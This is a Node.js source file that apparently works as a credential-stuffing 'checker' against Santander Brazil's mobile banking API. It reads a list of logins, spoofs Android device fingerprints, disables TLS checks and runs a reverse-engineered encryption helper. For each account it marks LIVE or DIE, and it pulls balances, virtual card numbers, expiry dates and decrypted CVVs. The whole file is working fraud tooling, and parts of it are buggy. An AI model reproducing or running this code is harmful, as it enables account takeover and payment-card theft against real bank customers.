const fs = require('fs');
const readline = require('readline');
const { Worker, WorkerData } = require('worker_threads');
const Virtual = require('./Virtual')
var execSync = require('child_process').execSync, child;

var unirest = require('unirest');

var creditos = "Feito por thequeen, fornecido pro charlão";
let f23050c = null;

const args = process.argv.slice(2);

var fileName = args[0];
if (fileName != undefined) {
    console.log('fileName', fileName);
    fs.open(fileName, 'r', function(err, fd) {
        if (err == null) {
            const fileStream = fs.createReadStream(fileName);
            var lista = [];
            const rl = readline.createInterface({
                input: fileStream,
                crlfDelay: Infinity
            });
    
            rl.on('line', function (line) {
                console.log('Line from file: ', line);
                lista.push(line);
            })
            .on('close', function(line) {
                console.log("number of lines ", lista.length);
                if(lista.length % 11 == 0) {
    
                } else if (lista.length % 10 == 0) {
                    
                } else if (lista.length % 9 == 0) {
                    
                } else if (lista.length % 8 == 0) {
                    
                } else if (lista.length % 7 == 0) {
                    
                } else if (lista.length % 6 == 0) {
                    
                } else if (lista.length % 5 == 0) {
                    
                } else if (lista.length % 4 == 0) {
                    
                } else {
                    despacharThread(lista, 1);
                } 
            });
        } else {
            console.log('Desculpe certifique-se de que o arquivo existe');
        }
    });
}

const runThread = (subList) => {
    return new Promise((resolve, reject) => {
        const worker = new Worker('./thequeen/MyThread.js', { workerData: subList });
        worker.once('message', result => {
            console.log('message', result);
        });
        worker.on('error', err => {
            console.log(err);
        });
        worker.on('exit', (code) => {
            if (code != 0)
                reject(new Error(`stopped with ${code} exit code`));
        })
    });
}

const despacharThread = async (lista, num) => {
    var comeco = 0;
    var fatia = lista.length / num;
    console.log('lista.length', lista.length);
    for(var i = 0 ; i < num; i++) {
        const result = await runThread(lista.slice(comeco, comeco + fatia));
        comeco += fatia;
    }
}

  class userLoginPayload {
    constructor() {
      this.documentNumber = null;
      this.appVersion = null;
      this.appVersionCode = null;
      this.deviceSystemName = null;
    }
  }

function getAlphaNumericString(n) {
    const alphaString = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvxyz';
    let sb = [];
    for(let i = 0 ;i < n ; i++) {
        let index = alphaString.length * Math.random();
        sb.push(alphaString.charAt(index));
    }
    return sb;
}

function transmitCard(ex, token, v) {
    let cards = v.puxarCartoes();
    let retorno = "";
    cards.forEach(vv => {
        if (vv['hasVirtualCard']) {
            try {
                let a = v.gerarVirtual(v.index,f23050c);
                let data = JSON.parse(a);
                if (a.indexOf('3333333333333333') == -1) {
                    let stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12438a ' + data['cvv'] + ' ' + f23050c);
                    data['cvv'] = stdout.toString();
                    console.log('data.cvv', data['cvv']);
                    let cc = "NUMERO: " + data['cardNumber'] + " | VALIDADE: " + data['dueDate'] + " | CVV: " + data['cvv'] + " | NOME: " + data['ownerName'] + " | LIMITE DISPONIVEL: " + v.limites(cartao.lastDigits) + "\n";
                    retorno += cc;
                }
            } catch (e) {

            }
        }
    })
    return retorno;
}

const login = async (username, password, action, loginResultProcess) => {
    let pubKey = null;
    let privKey = null;
    let stdout = null;
    stdout = execSync('java -jar app.jar mo12430e');
    stdout = stdout.toString();
    console.log('stdout', stdout);

    pubKey = stdout.split(',')[0];
    privKey = stdout.split(',')[1];
    
    let nonce = null;
    let serverDLBv1 = null;

    await unirest
    .post('https://m.santander.com.br/key-exchange/v1/exchange')
    .strictSSL(false)
    .headers({'Accept': 'application/json', 'Content-Type': 'application/json'})
    .send({ "dlbClientKey": pubKey})
    .then((response) => {
        console.log('response', response.body);
        nonce = response.body["nonce"];
        serverDLBv1 = response.body["serverDLBv1"];
    })
    .catch(err => {
        console.log(err);
        loginResultProcess(action, "error");
    })
    
    stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12427f ' + serverDLBv1 + ' ' + privKey);
    stdout = stdout.toString();
    console.log('stdout', stdout);
    f23050c = stdout;

    stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12438a ' + nonce + ' ' + f23050c);
    stdout = stdout.toString();
    console.log('stdout', stdout);
    let exchangeDecrypted = stdout;

    let ex = JSON.parse(exchangeDecrypted);
    let userPayload = new userLoginPayload();
    userPayload.appVersion = "12.8.0.0";
    userPayload.appVersionCode = "100221";
    userPayload.deviceSystemName = "ANDROID";
    userPayload.documentNumber = username;
    let userPayloadJSON = JSON.stringify(userPayload);
    console.log('userPayloadJSON', userPayloadJSON);
    let authorization = Buffer.from(ex['contextId'] + ":" + ex['token'], 'base64');
    stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12433c ' + userPayloadJSON.toString() + ' ' + f23050c);
    let body = stdout.toString();
    console.log('stdout', body);
    let token = null;
    await unirest
        .post('https://m.santander.com.br/settings/v1/check')
        .strictSSL(false)
        .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization,
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
            'versao-mbb' : '12.1.0.0',
            'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
        .send(body)
        .then((response) => {
            token = response.headers.get('access-token').get(0);
        })

    let tokenb = Buffer.from(token, 'base64');
    let token2 = tokenb.toString();
    let ts = Date.now();
    let token3 = null;
    let response3 = null;
    authorization = Buffer.from(ex['contextId'] + ":" + token2, 'base64');
    stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12433c ' + "{\"deviceId\":\"" + getAlphaNumericString(43) + "\",\"lastPasswordChangeDate\":\"\",\"deviceInfo\":{\"CellTowerId\":\"47108\",\"DeviceSystemVersion\":\"31\",\"SDK_VERSION\":\"3.6.0\",\"DeviceName\":\"null\",\"WiFiMacAddress\":\"02:00:00:00:00:00\",\"RSA_ApplicationKey\":\"null\",\"Emulator\":0,\"MNC\":\"260\",\"LocationAreaCode\":\"8514\",\"PhoneNumber\":\"-1\",\"OS_ID\":\"null\",\"MultitaskingSupported\":true,\"Languages\":\"en\",\"DeviceModel\":\"SAMSUNG\",\"GeoLocationInfo\":[{\"Status\":\"0\",\"Timestamp\":\"" + ts.toString() + "\",\"Latitude\":\"0\",\"Longitude\":\"1\"}],\"DeviceSystemName\":\"Android\",\"Compromised\":0,\"ScreenSize\":\"1080x1794\",\"WiFiNetworksData\":{\"Channel\":\"null\",\"SignalStrength\":\"-50\"},\"MCC\":\"310\",\"SIM_ID\":\"-1\",\"HardwareID\":\"null\"}}" + ' ' + f23050c);
    body = stdout.toString();
    console.log('stdout', body);

    await unirest
        .post('https://m.santander.com.br/user/v1/check')
        .strictSSL(false)
        .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization,
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
            'versao-mbb' : '12.1.0.0',
            'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
        .send(body)
        .then((response) => {
            response3 = response;
            token3 = response.headers.get('access-token').get(0);
        })

    let tokenb2 = Buffer.from(token3, 'base64');
    let token4 = tokenb2.toString();
    let token5 = null;
    let response4 = null;
    stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12433c_senha ' + password + ' ' + f23050c);
    let body1 = stdout.toString();
    console.log('stdout', body1);

    stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12433c ' + '{\"password\":\"" + body1 + "\",\"touchIdIntent\":\"none\",\"deviceInfo\":{\"HardwareID\":\"" + getAlphaNumericString(43) + "\",\"SIM_ID\":\"-1\",\"PhoneNumber\":\"-1\",\"GeoLocationInfo\":[{\"Longitude\":\"0\",\"Latitude\":\"0\",\"HorizontalAccuracy\":\"5\",\"Altitude\":\"5\",\"AltitudeAccuracy\":\"5\",\"Timestamp\":\"" + mytimestamp + "\",\"Heading\":\"0\",\"Speed\":\"0\",\"Status\":\"0\"}],\"DeviceModel\":\"SAMSUNG\",\"MultitaskingSupported\":true,\"DeviceName\":\"SAMSUNG\",\"DeviceSystemName\":\"Android\",\"DeviceSystemVersion\":\"31\",\"Languages\":\"en\",\"WiFiMacAddress\":\"02:00:00:00:00:00\",\"WiFiNetworksData\":{\"BBSID\":\"00:13:10:85:fe:01\",\"SignalStrength\":\"-50\",\"Channel\":\"null\",\"SSID\":\"AndroidWifi\"},\"CellTowerId\":\"0\",\"LocationAreaCode\":\"0\",\"ScreenSize\":\"1080x1794\",\"RSA_ApplicationKey\":\"" + getAlphaNumericString(32) + "\",\"MCC\":\"0\",\"MNC\":\"0\",\"OS_ID\":\"null\",\"SDK_VERSION\":\"3.6.0\",\"Compromised\":0,\"Emulator\":0,\"FrontCameraAvailable\":false},\"santanderIdEnabled\":false,\"sddData\":\"\"}' + ' ' + f23050c);
    body = stdout.toString();
    console.log('stdout', body);

    try {
        await unirest
        .post('https://m.santander.com.br/user-auth/v1/authenticate')
        .strictSSL(false)
        .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization,
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
            'versao-mbb' : '12.1.0.0',
            'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
        .send(body)
        .then((response) => {
            token5 = response.headers.get('access-token').get(0);
            response4 = response;
        })

        let tokenb3 = Buffer.from(token5, 'base64');
        let token6 = tokenb3.toString();
        let v = new Virtual(ex, token6);
        let puxarSaldo = v.puxarSaldo();

        stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12438a ' + puxarSaldo + ' ' + f23050c);
        let saldoJsontext = stdout.toString();
        console.log('saldoJsontext', saldoJsontext);

        let saldo = JSON.parse(saldoJsontext);
        let cards = transmitCard(ex, token6, v);

        stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12438a ' + response4.body + ' ' + f23050c);
        let myjson = stdout.toString();
        console.log('myjson', myjson);
        let liveObj = JSON.parse(myjson);
        loginResultProcess(action, cards + "LIVE|" + liveObj['santanderIdEnabling']['action'] + "  SALDO + CHEQUE ESPECIAL: " + saldo['accountBalances'][0]['availableBalancePlusOverdraft']);
    } catch (e) {
        stdout = execSync('java -jar D:\\Work\\Java\\SantaBankerCheckerProxy\\app\\build\\libs\\app.jar mo12438a ' + response3.body + ' ' + f23050c);
        let myjson2 = stdout.toString();
        console.log('myjson2', myjson2);
        let dieObj = JSON.parse(myjson2);
        loginResultProcess(action, "DIE|" + dieObj['message']);
    }
}

module.exports = { login };